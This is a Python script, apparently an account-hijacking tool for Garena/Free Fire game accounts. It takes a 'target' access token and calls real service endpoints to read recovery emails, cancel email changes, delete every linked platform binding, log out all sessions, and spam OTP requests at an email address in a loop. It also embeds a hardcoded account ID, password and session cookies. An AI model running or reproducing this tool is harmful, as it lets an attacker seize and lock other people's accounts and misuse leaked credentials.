import requests, random, os , time
from cfonts import render
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from urllib.parse import urlparse, parse_qs
from K4Rrem import *

console = Console()
ToKs = []

def GeTPlatForm(char):
    m = {3: "FaceBooK" , 7: "HuawEi" , 8: "GmaiL" , 10: "IcLoud" , 5: "Vk" , 11: "TwiTTer"}
    return m.get(char)
    
def convert(s):
    d,h=divmod(s,86400);h,m=divmod(h,3600);m,s=divmod(m,60)
    return f"{d} Day {h} Hour {m} Min {s} Sec"
        
def ChEcK(T):
    R = requests.Session().get(f'https://100067.connect.garena.com/oauth/token/inspect?token={T}')
    if R.status_code == 200 and 'open_id' in R.json(): return True
    return False

def ClEaR():
    os.system('cls' if os.name == 'nt' else 'clear')

def BaNNeR(N):
    ClEaR()
    print(render(f'{N}',colors=['white', random.choice(['red', 'green', 'yellow', 'blue', 'magenta', 'cyan'])],align='center'))

def C_Em(A):
    BaNNeR('spirit')
    try:
        r = requests.get("https://100067.connect.garena.com/game/account_security/bind:get_bind_info",params={'app_id':"100067",'access_token':A},headers={'User-Agent':"GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",'Connection':"Keep-Alive",'Accept-Encoding':"gzip"})
        if r.status_code == 200:
            rr = r.json()
            e = rr.get("email","")
            t = rr.get("email_to_be","")
            c = rr.get("request_exec_countdown",0)
    
            if e == "" and t: txt = f"EmaiL ToBe => {t}\nConFiRm aT => {convert(c)}"
            elif e and not t: txt = f"EmaiL CnF => {e}\nStaTus => ConFirmEd!"
            elif e and t: txt = f"EmaiL CnF => {e}\nEmaiL ToBe => {t}\nConFiRm aT => {convert(c)}"
            else: txt = "No RecovEry EmaiL!"
    except:pass
    
    console.print(Align.center(Panel(txt,title='[bold green]ChEcKinG EmaiL[/bold green]',border_style='green',width=60))) ; input()
    
def C_BinDs(A):
    BaNNeR('spirit')
    try:
        r = requests.get("https://100067.connect.garena.com/bind/app/platform/info/get",params={'app_id':"100067",'access_token':A},headers={'User-Agent':"GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",'Connection':"Keep-Alive",'Accept-Encoding':"gzip"})
        if r.status_code != 200: return
        rr = r.json()
        b = rr.get("bounded_accounts", [])
        if not b: console.print(Align.center(Panel("[bold red]No BinD AcTive![/bold red]", border_style="red", width=60))) ; time.sleep(4) ; MeNu()
        res = []
        for i in b: pid = i if isinstance(i, int) else i.get("platform") or i.get("platform_id") ; res.append(GeTPlatForm(pid) or str(pid))
        console.print(Align.center(Panel("\n".join(res), title="[bold green]BinD AcTiVinG[/bold green]", border_style="green", width=60)))
    except: pass
    input()
    
def F_EmaiL():
    BaNNeR('Fix')
    E = console.input('\n[bold green]=> EmaiL : [/bold green]')
    try:
        url = "https://sso.garena.com/api/send_register_code_email"
        payload = {'username': "K4rrem",'email': E , 'locale': "en-SG", 'format': "json", 'id': "1781263988410"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.179 Mobile Safari/537.36",
  'Accept': "application/json, text/plain, */*",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-ch-ua': "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
  'sec-ch-ua-mobile': "?1",
  'Origin': "https://sso.garena.com",
  'X-Requested-With': "mark.via.gp",
  'Sec-Fetch-Site': "same-origin",
  'Sec-Fetch-Mode': "cors",
  'Sec-Fetch-Dest': "empty",
  'Referer': "https://sso.garena.com/universal/register?locale=en-SG",
  'Accept-Language': "en-US,en;q=0.9",
  'Cookie': "_hjSessionUser_6374922=eyJpZCI6ImZkYjRlNGVlLTNiYWEtNWFiNy05YzcxLWQ0NDc4YjhjNmU3ZCIsImNyZWF0ZWQiOjE3NjM1OTI0NzMxMDcsImV4aXN0aW5nIjp0cnVlfQ==; apple_state_key=ce87e162f0af11f0b499620db1df30d0; datadome=GD2M_I0w_9UKriPZOwrwAAlaCs~dbPGWyXHLl6bxMntVCtQKbaODhsVNcxLoUTs7jRX0MXkyK1IpeUyBWyFtVMxaH1RtJ8UhDu9SkhCV2GUKrXzLSnz0t62koZVdlKwt"}        
        r = requests.post(url, data=payload, headers=headers)
        if r.status_code != 200: return            
        rr = r.json()
        b = rr.get("result") == 0        
        if not b: console.print(Align.center(Panel("[bold red]ErroR FixinG EmaiL ![/bold red]", border_style="red", width=60))) ; time.sleep(3) ; MeNu() ; return            
        console.print(Align.center(Panel("[bold green]SuccEss FixinG EmaiL ![/bold green]", border_style="green", width=60))) ; time.sleep(3) ; MeNu() ; return
        
    except Exception as e: print(e)
    
def Cn_EmaiL(A):
    BaNNeR('EmaiL')
    UrL = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    PyL = {'app_id': "100067" , 'access_token': A}
    Hr = {'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)" , 'Connection': "Keep-Alive" , 'Accept-Encoding': "gzip"}
    RsP = requests.post(UrL , data = PyL , headers = Hr)
    if RsP.status_code == 200: console.print(Align.center(Panel("[bold green]SuccEss CanCELinG EmaiL ![/bold green]", border_style="green", width=60))) ; time.sleep(3) ; MeNu() ; return
    else: console.print(Align.center(Panel("[bold red]ErroR CanCELinG EmaiL ![/bold red]", border_style="red", width=60))) ; time.sleep(3) ; MeNu() ; return

def R_Binds(A): 
    BaNNeR('Bind')  
    UrL = "https://clientbp.ggpolarbear.com/BindDelete"
    Hr = {'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip", 'Content-Type': "application/x-www-form-urlencoded", 'Expect': "100-continue" , 'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': f"OB53"}
    JwT = xJwT('4142950809' , 'xBesTo_YMR8OS7OKU2X' , 4)
    D = PLaTForM(A)
    total = len(D)
    if total == 0: console.print(Align.center(Panel("[bold red]No BinDs FounD ![/bold red]", border_style="red", width=60))) ; time.sleep(3) ; MeNu() ; return
    ClEaR()
    print(render('BinD', colors=['white', 'blue'], align='center'), '\n')
    TexT = f'[TarGeT BoT] > FF - BinD (V1.0)\n[BoT sTaTus] > [bold green]ConEcTed SuccEssFuLy SuppoRT aLL[/bold green]\n[BinDs inFo] > FounD : {total}\n[BoT DevLoPer] > AbdeeLKaRem AmiRi'
    panel = Panel(Align.center(TexT) , title="[bold blue]FF - BinD[/bold blue]" , border_style="bright_blue" , padding=(1, 2) , expand=False)
    console.print(panel)
    ReM = input('- RemovE aLL BinD ? => [Yes/No] : ')
    if ReM in ['y' , 'yes' , 'Y' , 'Yes']:
        for i , (P , U) in enumerate(D , 1):
            PyL = {1: f"{A}", 2: f"{P}", 3: f"{U}"}
            PyL = bytes.fromhex(EnC_AEs(CrEaTe_ProTo(PyL).hex()))
            Hr['Authorization']= f"Bearer {JwT}"
            R = requests.post(UrL , data = PyL , headers = Hr)
            Rr = R.content.decode() if isinstance(R.content , bytes) else R.content
            if R.status_code == 200:
                TexT = f'- STarT RemovinG BinD => {U} , {P}\n- ResPonsE => {R.status_code} , True , [bold green]SuccEssFuLy RemovE BinD[/bold green]'
                panel = Panel(Align.center(TexT) , title="[bold yellow]FF - BinD[/bold yellow]" , border_style="bright_yellow" , padding=(1, 2) , expand=False) ; console.print(panel)
            else:
                TexT = f'- STarT RemovinG BinD => {U} , {P}\n- ResPonsE => {R.status_code} , False , [bold red]FaiLeD RemovE BinD[/bold red]\n- BcZ => {Rr}'
                panel = Panel(Align.center(TexT) , title="[bold yellow]FF - BinD[/bold yellow]" , border_style="bright_yellow" , padding=(1, 1) , expand=False) ; console.print(panel)

    LoG = input('- LoGouT aLL ? => [Yes/No] : ')
    if LoG in ['y' , 'yes' , 'Y' , 'Yes']:
        L = LoGouT(T , JwT)
        if True == L:
            TexT = f'- STarT LoGouT aLL From AccounT\n- ResPonsE => True , [bold green]SuccEssFuLy LoGouT aLL[/bold green]'
            panel = Panel(Align.center(TexT) , title="[bold green]FF - BinD[/bold green]" , border_style="bright_green" , padding=(1, 2) , expand=False) ; console.print(panel)
        else: 
            TexT = f'- STarT LoGouT aLL From AccounT\n- ResPonsE => False , [bold red]FaiLeD LoGouT aLL[/bold red]'
            panel = Panel(Align.center(TexT) , title="[bold red]FF - BinD[/bold red]" , border_style="bright_red" , padding=(1, 2) , expand=False) ; console.print(panel) 
                    
def Bn_EmaiL(): 
    BaNNeR('Band')   
    E = console.input('\n[bold green]=> EmaiL : [/bold green]')
    E2 = E.replace('@hi2.in' , '.@hi2.in')
    url = "https://100067.connect.garena.com/game/account_security/swap:send_otp"  
    payload = {'app_id': "100067",'email': E, 'locale': "en_US"}
    payload2 = {'app_id': "100067",'email': E2, 'locale': "en_US"}
    headers = {
        'User-Agent': "GarenaMSDK/4.0.39(Redmi Note 5 ;Android 9;en;US;)",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Cookie': "datadome=51PRnf~WKDXs9znrqWWqSSw80aucX31DM23uXWcRmKj2yYG0971jodxjTCAQwVXxbg3NzAyqNvMZXxe9eEsQh9wy95EX2orTgJke3dbbPZ9O4EnwMPmDoUcUUiNVUfWM"}
    session = requests.Session()
    
    for i in range(10):
        try:
            r1 = session.post(url, data=payload, headers=headers, timeout=30)
            r2 = session.post(url, data=payload2, headers=headers, timeout=30)
            if r1.status_code == 200 and r2.status_code == 200:
                console.print(Align.center(Panel(f"[bold green]=> {r1.json()} / {r2.json()}[/bold green]", border_style="green", width=60)))
        except requests.exceptions.RequestException as e: time.sleep(1) ; continue
        except Exception as e: time.sleep(1) ; continue
        time.sleep(0.5)
    
    console.print(Align.center(Panel("[bold green]SuccEss BannED EmaiL ![/bold green]", border_style="green", width=60))) ; time.sleep(3) ; MeNu() ; return

def LG(A): 
    BaNNeR('logout') 
    JwT = xJwT('4142950809' , 'xBesTo_YMR8OS7OKU2X' , 4)
    L = LoGouT(A , JwT)
    if True == L:
        console.print(Align.center(Panel(f"[bold green]SuccEssFuLy LoGOuT From AccounT[/bold green]", border_style="green", width=60))) ; time.sleep(4) ; exit() ; return
    else: 
        console.print(Align.center(Panel(f"[bold red] UnSuccEssFuLy LoGOuT From AccounT[/bold red]", border_style="red", width=60))) ; time.sleep(4) ; MeNu() ; return
                        	                           
def MeNu():
    while True:
        BaNNeR('spirit')
        if not ToKs: console.print(Align.center(Panel('[red]No ToKeN FounD[/red]', width=40))) ; time.sleep(2) ; return

        try:
            R = requests.Session().get(f'https://api-otrss.garena.com/support/callback/?access_token={ToKs[0]}',allow_redirects=True)

            Q = parse_qs(urlparse(R.url).query)
            N = Q.get("nickname", ["Unknown"])[0]
            U = Q.get("account_id", ["Unknown"])[0]
            G = Q.get("region", ["Unknown"])[0]

        except:N , U , G = "UnKnowN", "UnKnowN", "UnKnowN"

        console.print(Align.center(Panel(
            f'TarGeT NamE => {N}\n'
            f'TarGeT UiD => {U}\n'
            f'TarGeT ReGioN => {G}\n'
            f'ToKen STaTus => VaLiD',
            title='[bold green]FF - SpiRiT[/bold green]',
            border_style='green', width=60)))

        console.print(Align.center(Panel(
            '[1] - ChEcK EmaiL\n'
            '[2] - ChEcK BinDs\n'
            '[3] - Fix EmaiL Cods\n'
            '[4] - CanCEL EmaiL\n'
            '[5] - DeLeTe BinDs\n'
            '[6] - BanD EmaiL (@hi2.in)\n'
            '[7] - LoGOuT aLL From AccounT\n'
            '[8] - SySTem LoGOuT',
            title='[bold yellow]MeNu[/bold yellow]',
            border_style='yellow', width=60)))

        C = console.input('\n[bold green]=> cHoosE : [/bold green]')
        if C == '1': C_Em(ToKs[0])
        if C == '2': C_BinDs(ToKs[0])
        if C == '3': F_EmaiL()
        if C == '4': Cn_EmaiL(ToKs[0])
        if C == '5': R_Binds(ToKs[0])
        if C == '6': Bn_EmaiL()
        if C == '7': LG(ToKs[0])
        elif C == '8': ToKs.clear() ; console.print(Align.center(Panel('[bold red]LoGGed OuT ...[/bold red]', border_style='red', width=40))) ; time.sleep(1); exit()

def LoGin():
    while True:
        BaNNeR('login')
        U = (
            'BoT Version => [bold red]V1.0 BeTa[/bold red]\n'
            'PowEeD By => AbdeLKaRem AmiRi\n'
            'ServER STaTus => [bold green]OnLinE[/bold green]'
        )
        console.print(Align.center(Panel(Align.center(U),title="[bold yellow]FF - SpiRiT[/bold yellow]",border_style="bright_yellow",padding=(1, 2),width=60)))
        T = console.input("\n[bold green]=> AccEss ToKen : [/bold green]")
        if ChEcK(T): console.print(Align.center(Panel("[bold green]SuccEssFuLy LoGin ...[/bold green]", border_style="green",width=40))) ; ToKs.append(T) ; time.sleep(3) ; MeNu() ; break
        console.print(Align.center(Panel("[bold red]UnSuccEssFuLy LoGin ![/bold red]" , border_style="red" , width=40)))
        time.sleep(3)

LoGin()